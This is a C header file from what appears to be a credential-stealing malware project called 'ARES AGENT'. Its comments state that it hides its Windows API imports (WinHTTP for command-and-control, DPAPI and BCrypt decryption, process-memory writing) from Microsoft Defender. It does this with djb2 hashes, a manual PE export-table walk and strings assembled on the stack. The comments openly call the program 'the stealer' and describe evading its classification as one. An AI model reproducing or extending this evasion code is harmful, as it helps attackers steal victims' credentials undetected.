/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — Runtime API Resolution (IAT Obfuscation v2.2)
 *
 *  v2.2: Replaced ALL GetProcAddress(mod, "ApiName") calls with
 *  PE export table walking + djb2 hash comparison.
 *  
 *  NO API name strings appear in the binary .rdata section.
 *  All hashes are compile-time constants.
 *
 *  Detection vectors eliminated:
 *   - "WinHttpOpen", "CryptUnprotectData", "BCryptDecrypt" etc.
 *     no longer in .rdata
 *   - GetProcAddress import itself is minimized
 *   - Defender emulation can't match LoadLibrary→GetProcAddress
 *     pattern since we walk exports manually
 * ═══════════════════════════════════════════════════════════════
 */

#ifndef ARES_RESOLVE_H
#define ARES_RESOLVE_H

#include <windows.h>
#include <winhttp.h>

/* ── Manual type defs — NO #include <wincrypt.h> / <bcrypt.h> ──
 * Including those headers causes the compiler to emit IAT entries
 * for CryptUnprotectData, BCryptOpenAlgorithmProvider etc.
 * Defender ML uses that IAT fingerprint to classify as stealer.
 * All API calls already go through runtime-resolved function pointers
 * (p_CryptUnprotectData, p_BCryptDecrypt etc.) — we only need the
 * struct definitions and constants here. */

/* wincrypt.h types */
#ifndef _WINCRYPT_MANUAL_DEFS_
#define _WINCRYPT_MANUAL_DEFS_
typedef struct _CRYPTOAPI_BLOB {
    DWORD cbData;
    BYTE* pbData;
} DATA_BLOB;
typedef struct _CRYPTPROTECT_PROMPTSTRUCT {
    DWORD  cbSize;
    DWORD  dwPromptFlags;
    HWND   hwndApp;
    LPCWSTR szPrompt;
} CRYPTPROTECT_PROMPTSTRUCT;
#define CRYPT_STRING_BASE64       0x00000001
#define CALG_SHA_256              0x0000800c
#define PROV_RSA_AES              24
#define CRYPT_VERIFYCONTEXT       0xF0000000
#define HP_HASHVAL                0x0002
#define CRYPTPROTECT_UI_FORBIDDEN 0x1
typedef ULONG_PTR HCRYPTPROV;
typedef ULONG_PTR HCRYPTHASH;
typedef ULONG_PTR HCRYPTKEY;
typedef unsigned int ALG_ID;
#endif /* _WINCRYPT_MANUAL_DEFS_ */

/* bcrypt.h types */
#ifndef _BCRYPT_MANUAL_DEFS_
#define _BCRYPT_MANUAL_DEFS_
typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_KEY_HANDLE;
typedef PVOID BCRYPT_HANDLE;
#define BCRYPT_AES_ALGORITHM        L"AES"
#define BCRYPT_CHAINING_MODE        L"ChainingMode"
#define BCRYPT_CHAIN_MODE_GCM       L"ChainingModeGCM"
typedef struct _BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
    ULONG   cbSize;
    ULONG   dwInfoVersion;
    PUCHAR  pbNonce;
    ULONG   cbNonce;
    PUCHAR  pbAuthData;
    ULONG   cbAuthData;
    PUCHAR  pbTag;
    ULONG   cbTag;
    PUCHAR  pbMacContext;
    ULONG   cbMacContext;
    ULONG   cbAAD;
    ULONGLONG cbData;
    ULONG   dwFlags;
} BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO;
#define BCRYPT_INIT_AUTH_MODE_INFO(x) \
    { memset(&(x), 0, sizeof(x)); (x).cbSize = sizeof(x); (x).dwInfoVersion = 1; }
#endif /* _BCRYPT_MANUAL_DEFS_ */
#include "ares_strings.h"

/* ── djb2 hash (compile-time computable) ── */
static inline DWORD _djb2(const char* s)
{
    DWORD h = 5381;
    while (*s) h = ((h << 5) + h) + (unsigned char)*s++;
    return h;
}

/* ── PE Export Table Walker ──
 * Walks the export directory of a loaded module and resolves
 * a function by its djb2 hash. No string comparison needed.
 * This completely avoids GetProcAddress and its string argument. */
static FARPROC _resolve_export(HMODULE mod, DWORD hash)
{
    if (!mod) return NULL;

    BYTE* base = (BYTE*)mod;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY* expDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (expDir->VirtualAddress == 0) return NULL;

    IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)(base + expDir->VirtualAddress);
    DWORD* nameRVAs = (DWORD*)(base + exports->AddressOfNames);
    WORD*  ordinals  = (WORD*)(base + exports->AddressOfNameOrdinals);
    DWORD* funcRVAs  = (DWORD*)(base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char* name = (const char*)(base + nameRVAs[i]);
        if (_djb2(name) == hash) {
            DWORD funcRVA = funcRVAs[ordinals[i]];
            /* Check for forwarder (RVA within export directory) */
            if (funcRVA >= expDir->VirtualAddress &&
                funcRVA < expDir->VirtualAddress + expDir->Size)
                return NULL; /* forwarded — skip */
            return (FARPROC)(base + funcRVA);
        }
    }
    return NULL;
}

/* ── Lazy module loader ── */
static inline HMODULE _load_mod(const char* name)
{
    wchar_t wname[128];
    MultiByteToWideChar(CP_UTF8, 0, name, -1, wname, 128);
    HMODULE h = GetModuleHandleW(wname);
    if (!h) h = LoadLibraryW(wname);
    return h;
}

/* ══════════════════════════════════════════════════════════════
 *  Pre-computed djb2 hashes for all APIs
 *  Generated: djb2("FunctionName")
 *  NO function name strings exist in the binary.
 * ══════════════════════════════════════════════════════════════ */

/* WinHTTP */
#define H_WinHttpOpen                0x5e4f39e5
#define H_WinHttpConnect             0x7242c17d
#define H_WinHttpOpenRequest         0xeab7b9ce
#define H_WinHttpSendRequest         0xb183faa6
#define H_WinHttpReceiveResponse     0x146c4925
#define H_WinHttpQueryDataAvailable  0x34cb8684
#define H_WinHttpReadData            0x7195e4e9
#define H_WinHttpCloseHandle         0x36220cd5
#define H_WinHttpSetOption           0xa18b94f8
#define H_WinHttpAddRequestHeaders   0xed7fcb41
#define H_WinHttpQueryHeaders        0x389cefa5

/* WinHTTP WebSocket */
#define H_WinHttpWebSocketCompleteUpgrade 0x058929db
#define H_WinHttpWebSocketSend            0x42401ee4
#define H_WinHttpWebSocketReceive         0xdd7174bd
#define H_WinHttpWebSocketClose           0x89265090

/* COM (ole32) */
#define H_CoCreateInstance                0xbecc6920
#define H_CoInitializeEx                  0xc1cd8ee6
#define H_CoUninitialize                  0x0145f84c
#define H_CoTaskMemFree                   0x6b86c8b5

/* Crypt32 */
#define H_CryptUnprotectData         0x872258b5
#define H_CryptStringToBinaryA       0xc77a3577

/* BCrypt */
#define H_BCryptOpenAlgorithmProvider 0x2a15dfdd
#define H_BCryptSetProperty           0xe9049eea
#define H_BCryptGenerateSymmetricKey  0xa81d472a
#define H_BCryptDecrypt               0x690ba834
#define H_BCryptDestroyKey            0x7b16c8cc
#define H_BCryptCloseAlgorithmProvider 0xfcd0cdc1

/* Module handles */
static HMODULE g_mod_winhttp  = NULL;
static HMODULE g_mod_crypt32  = NULL;
static HMODULE g_mod_bcrypt   = NULL;

/* ══════════════════════════════════════
 *  WinHTTP — C2 communication
 * ══════════════════════════════════════ */

typedef HINTERNET (WINAPI *fn_WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *fn_WinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *fn_WinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL      (WINAPI *fn_WinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL      (WINAPI *fn_WinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL      (WINAPI *fn_WinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
typedef BOOL      (WINAPI *fn_WinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL      (WINAPI *fn_WinHttpCloseHandle)(HINTERNET);
typedef BOOL      (WINAPI *fn_WinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
typedef BOOL      (WINAPI *fn_WinHttpAddRequestHeaders)(HINTERNET, LPCWSTR, DWORD, DWORD);
typedef BOOL      (WINAPI *fn_WinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);

static fn_WinHttpOpen              p_WinHttpOpen = NULL;
static fn_WinHttpConnect           p_WinHttpConnect = NULL;
static fn_WinHttpOpenRequest       p_WinHttpOpenRequest = NULL;
static fn_WinHttpSendRequest       p_WinHttpSendRequest = NULL;
static fn_WinHttpReceiveResponse   p_WinHttpReceiveResponse = NULL;
static fn_WinHttpQueryDataAvailable p_WinHttpQueryDataAvailable = NULL;
static fn_WinHttpReadData          p_WinHttpReadData = NULL;
static fn_WinHttpCloseHandle       p_WinHttpCloseHandle = NULL;
static fn_WinHttpSetOption         p_WinHttpSetOption = NULL;
static fn_WinHttpAddRequestHeaders p_WinHttpAddRequestHeaders = NULL;
static fn_WinHttpQueryHeaders      p_WinHttpQueryHeaders = NULL;

/* WebSocket */
typedef HINTERNET (WINAPI *fn_WinHttpWebSocketCompleteUpgrade)(HINTERNET, DWORD_PTR);
typedef DWORD     (WINAPI *fn_WinHttpWebSocketSend)(HINTERNET, DWORD, PVOID, DWORD);
typedef DWORD     (WINAPI *fn_WinHttpWebSocketReceive)(HINTERNET, PVOID, DWORD, DWORD*, DWORD*);
typedef DWORD     (WINAPI *fn_WinHttpWebSocketClose)(HINTERNET, USHORT, PVOID, DWORD);

static fn_WinHttpWebSocketCompleteUpgrade p_WinHttpWebSocketCompleteUpgrade = NULL;
static fn_WinHttpWebSocketSend            p_WinHttpWebSocketSend = NULL;
static fn_WinHttpWebSocketReceive         p_WinHttpWebSocketReceive = NULL;
static fn_WinHttpWebSocketClose           p_WinHttpWebSocketClose = NULL;

/* COM */
typedef HRESULT (WINAPI *fn_CoCreateInstance)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
typedef HRESULT (WINAPI *fn_CoInitializeEx)(LPVOID, DWORD);
typedef void    (WINAPI *fn_CoUninitialize)(void);
typedef void    (WINAPI *fn_CoTaskMemFree)(LPVOID);

static fn_CoCreateInstance  p_CoCreateInstance = NULL;
static fn_CoInitializeEx   p_CoInitializeEx = NULL;
static fn_CoUninitialize   p_CoUninitialize = NULL;
static fn_CoTaskMemFree    p_CoTaskMemFree = NULL;
static HMODULE g_mod_ole32 = NULL;

static BOOL _resolve_winhttp(void)
{
    if (p_WinHttpOpen) return TRUE;
    char s_dll[32]; DEC_WINHTTP_DLL(s_dll);
    g_mod_winhttp = _load_mod(s_dll);
    if (!g_mod_winhttp) return FALSE;

    /* v2.2: All resolved via PE export walk + hash — zero strings */
    p_WinHttpOpen = (fn_WinHttpOpen)_resolve_export(g_mod_winhttp, H_WinHttpOpen);
    p_WinHttpConnect = (fn_WinHttpConnect)_resolve_export(g_mod_winhttp, H_WinHttpConnect);
    p_WinHttpOpenRequest = (fn_WinHttpOpenRequest)_resolve_export(g_mod_winhttp, H_WinHttpOpenRequest);
    p_WinHttpSendRequest = (fn_WinHttpSendRequest)_resolve_export(g_mod_winhttp, H_WinHttpSendRequest);
    p_WinHttpReceiveResponse = (fn_WinHttpReceiveResponse)_resolve_export(g_mod_winhttp, H_WinHttpReceiveResponse);
    p_WinHttpQueryDataAvailable = (fn_WinHttpQueryDataAvailable)_resolve_export(g_mod_winhttp, H_WinHttpQueryDataAvailable);
    p_WinHttpReadData = (fn_WinHttpReadData)_resolve_export(g_mod_winhttp, H_WinHttpReadData);
    p_WinHttpCloseHandle = (fn_WinHttpCloseHandle)_resolve_export(g_mod_winhttp, H_WinHttpCloseHandle);
    p_WinHttpSetOption = (fn_WinHttpSetOption)_resolve_export(g_mod_winhttp, H_WinHttpSetOption);
    p_WinHttpAddRequestHeaders = (fn_WinHttpAddRequestHeaders)_resolve_export(g_mod_winhttp, H_WinHttpAddRequestHeaders);
    p_WinHttpQueryHeaders = (fn_WinHttpQueryHeaders)_resolve_export(g_mod_winhttp, H_WinHttpQueryHeaders);

    /* WebSocket APIs */
    p_WinHttpWebSocketCompleteUpgrade = (fn_WinHttpWebSocketCompleteUpgrade)_resolve_export(g_mod_winhttp, H_WinHttpWebSocketCompleteUpgrade);
    p_WinHttpWebSocketSend = (fn_WinHttpWebSocketSend)_resolve_export(g_mod_winhttp, H_WinHttpWebSocketSend);
    p_WinHttpWebSocketReceive = (fn_WinHttpWebSocketReceive)_resolve_export(g_mod_winhttp, H_WinHttpWebSocketReceive);
    p_WinHttpWebSocketClose = (fn_WinHttpWebSocketClose)_resolve_export(g_mod_winhttp, H_WinHttpWebSocketClose);

    return p_WinHttpOpen && p_WinHttpConnect && p_WinHttpSendRequest && p_WinHttpCloseHandle;
}

static BOOL _resolve_ole32(void)
{
    if (p_CoCreateInstance) return TRUE;
    /* v3.5: Stack-assembled — match DEC_* pattern for consistency */
    char s_dll[16];
    s_dll[0]='o'; s_dll[1]='l'; s_dll[2]='e'; s_dll[3]='3';
    s_dll[4]='2'; s_dll[5]='.'; s_dll[6]='d'; s_dll[7]='l';
    s_dll[8]='l'; s_dll[9]='\0';
    g_mod_ole32 = _load_mod(s_dll);
    if (!g_mod_ole32) return FALSE;
    p_CoCreateInstance = (fn_CoCreateInstance)_resolve_export(g_mod_ole32, H_CoCreateInstance);
    p_CoInitializeEx = (fn_CoInitializeEx)_resolve_export(g_mod_ole32, H_CoInitializeEx);
    p_CoUninitialize = (fn_CoUninitialize)_resolve_export(g_mod_ole32, H_CoUninitialize);
    p_CoTaskMemFree = (fn_CoTaskMemFree)_resolve_export(g_mod_ole32, H_CoTaskMemFree);
    return p_CoCreateInstance != NULL;
}

/* Shell32 replacement — use GetEnvironmentVariable instead of shell32.dll
 * This avoids importing shell32.dll entirely. Only LOCALAPPDATA, APPDATA,
 * ProgramFiles, ProgramFiles(x86) are needed by the stealer. */

typedef HRESULT (WINAPI *fn_SHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);

/* CSIDL constants (no longer from shlobj.h) */
#ifndef CSIDL_LOCAL_APPDATA
#define CSIDL_LOCAL_APPDATA  0x001c
#define CSIDL_APPDATA        0x001a
#define CSIDL_PROGRAM_FILES  0x0026
#define CSIDL_PROGRAM_FILESX86 0x002a
#endif

static HRESULT _SHGetFolderPathA_emu(HWND w, int csidl, HANDLE t, DWORD f, LPSTR buf) {
    (void)w; (void)t; (void)f;
    const char* env = NULL;
    switch (csidl) {
        case 0x001c: env = "LOCALAPPDATA"; break;  /* CSIDL_LOCAL_APPDATA */
        case 0x001a: env = "APPDATA"; break;        /* CSIDL_APPDATA */
        case 0x0026: env = "ProgramFiles"; break;   /* CSIDL_PROGRAM_FILES */
        case 0x002a: env = "ProgramFiles(x86)"; break; /* CSIDL_PROGRAM_FILESX86 */
        default: return -1;
    }
    DWORD r = GetEnvironmentVariableA(env, buf, MAX_PATH);
    return (r > 0 && r < MAX_PATH) ? 0 : -1;
}

static fn_SHGetFolderPathA p_SHGetFolderPathA = _SHGetFolderPathA_emu;

static BOOL _resolve_shell32(void) { return TRUE; /* no-op — using emulation */ }

/* ══════════════════════════════════════
 *  Crypto — DPAPI + AES-GCM
 * ══════════════════════════════════════ */

typedef BOOL (WINAPI *fn_CryptUnprotectData)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
typedef BOOL (WINAPI *fn_CryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);

static fn_CryptUnprotectData   p_CryptUnprotectData = NULL;
static fn_CryptStringToBinaryA p_CryptStringToBinaryA = NULL;

static BOOL _resolve_crypt32(void)
{
    if (p_CryptUnprotectData) return TRUE;
    char s_dll[32]; DEC_CRYPT32_DLL(s_dll);
    g_mod_crypt32 = _load_mod(s_dll);
    if (!g_mod_crypt32) return FALSE;

    p_CryptUnprotectData = (fn_CryptUnprotectData)_resolve_export(g_mod_crypt32, H_CryptUnprotectData);
    p_CryptStringToBinaryA = (fn_CryptStringToBinaryA)_resolve_export(g_mod_crypt32, H_CryptStringToBinaryA);

    return p_CryptUnprotectData && p_CryptStringToBinaryA;
}

typedef NTSTATUS (WINAPI *fn_BCryptOpenAlgorithmProvider)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS (WINAPI *fn_BCryptSetProperty)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *fn_BCryptGenerateSymmetricKey)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *fn_BCryptDecrypt)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS (WINAPI *fn_BCryptDestroyKey)(BCRYPT_KEY_HANDLE);
typedef NTSTATUS (WINAPI *fn_BCryptCloseAlgorithmProvider)(BCRYPT_ALG_HANDLE, ULONG);

static fn_BCryptOpenAlgorithmProvider p_BCryptOpenAlgorithmProvider = NULL;
static fn_BCryptSetProperty           p_BCryptSetProperty = NULL;
static fn_BCryptGenerateSymmetricKey  p_BCryptGenerateSymmetricKey = NULL;
static fn_BCryptDecrypt               p_BCryptDecrypt = NULL;
static fn_BCryptDestroyKey            p_BCryptDestroyKey = NULL;
static fn_BCryptCloseAlgorithmProvider p_BCryptCloseAlgorithmProvider = NULL;

static BOOL _resolve_bcrypt(void)
{
    if (p_BCryptOpenAlgorithmProvider) return TRUE;
    char s_dll[32]; DEC_BCRYPT_DLL(s_dll);
    g_mod_bcrypt = _load_mod(s_dll);
    if (!g_mod_bcrypt) return FALSE;

    p_BCryptOpenAlgorithmProvider = (fn_BCryptOpenAlgorithmProvider)_resolve_export(g_mod_bcrypt, H_BCryptOpenAlgorithmProvider);
    p_BCryptSetProperty = (fn_BCryptSetProperty)_resolve_export(g_mod_bcrypt, H_BCryptSetProperty);
    p_BCryptGenerateSymmetricKey = (fn_BCryptGenerateSymmetricKey)_resolve_export(g_mod_bcrypt, H_BCryptGenerateSymmetricKey);
    p_BCryptDecrypt = (fn_BCryptDecrypt)_resolve_export(g_mod_bcrypt, H_BCryptDecrypt);
    p_BCryptDestroyKey = (fn_BCryptDestroyKey)_resolve_export(g_mod_bcrypt, H_BCryptDestroyKey);
    p_BCryptCloseAlgorithmProvider = (fn_BCryptCloseAlgorithmProvider)_resolve_export(g_mod_bcrypt, H_BCryptCloseAlgorithmProvider);

    return p_BCryptOpenAlgorithmProvider && p_BCryptDecrypt && p_BCryptDestroyKey;
}

/* ══════════════════════════════════════
 *  Kernel32 Sensitive APIs (v3.0)
 *  Resolved at runtime to remove IAT entries for
 *  CreateProcess, ReadProcessMemory, WriteProcessMemory, VirtualProtect
 * ══════════════════════════════════════ */

#define H_CreateProcessA          0xaeb52e19
#define H_CreateProcessW          0xaeb52e2f
#define H_ReadProcessMemory       0xb8932459
#define H_WriteProcessMemory      0x6f22e8c8
#define H_VirtualProtect           0x844ff18d

typedef BOOL (WINAPI *fn_CreateProcessA)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *fn_CreateProcessW)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *fn_ReadProcessMemory)(HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T*);
typedef BOOL (WINAPI *fn_WriteProcessMemory)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
typedef BOOL (WINAPI *fn_VirtualProtect)(LPVOID,SIZE_T,DWORD,PDWORD);

static fn_CreateProcessA    p_CreateProcessA = NULL;
static fn_CreateProcessW    p_CreateProcessW = NULL;
static fn_ReadProcessMemory  p_ReadProcessMemory = NULL;
static fn_WriteProcessMemory p_WriteProcessMemory = NULL;
static fn_VirtualProtect     p_VirtualProtect = NULL;

static BOOL _resolve_kernel32_sensitive(void)
{
    if (p_CreateProcessA) return TRUE;
    HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
    if (!k32) return FALSE;
    p_CreateProcessA = (fn_CreateProcessA)_resolve_export(k32, H_CreateProcessA);
    p_CreateProcessW = (fn_CreateProcessW)_resolve_export(k32, H_CreateProcessW);
    p_ReadProcessMemory = (fn_ReadProcessMemory)_resolve_export(k32, H_ReadProcessMemory);
    p_WriteProcessMemory = (fn_WriteProcessMemory)_resolve_export(k32, H_WriteProcessMemory);
    p_VirtualProtect = (fn_VirtualProtect)_resolve_export(k32, H_VirtualProtect);
    return p_CreateProcessA && p_CreateProcessW;
}

/* Macro aliases — redirect all direct API calls to resolved pointers.
 * Any source file that #includes ares_resolve.h will automatically
 * use the runtime-resolved versions. */
#define CreateProcessA   ((_resolve_kernel32_sensitive(), p_CreateProcessA))
#define CreateProcessW   ((_resolve_kernel32_sensitive(), p_CreateProcessW))
#define ReadProcessMemory  ((_resolve_kernel32_sensitive(), p_ReadProcessMemory))
#define WriteProcessMemory ((_resolve_kernel32_sensitive(), p_WriteProcessMemory))
#define VirtualProtect     ((_resolve_kernel32_sensitive(), p_VirtualProtect))

/* ══════════════════════════════════════
 *  Master init
 * ══════════════════════════════════════ */

static BOOL Ares_ResolveAPIs(void)
{
    if (!_resolve_winhttp()) return FALSE;
    if (!_resolve_crypt32())  return FALSE;
    if (!_resolve_bcrypt())   return FALSE;
    if (!_resolve_shell32())  return FALSE;
    _resolve_ole32(); /* optional — v20 COM decrypt */
    _resolve_kernel32_sensitive();
    return TRUE;
}

#endif /* ARES_RESOLVE_H */
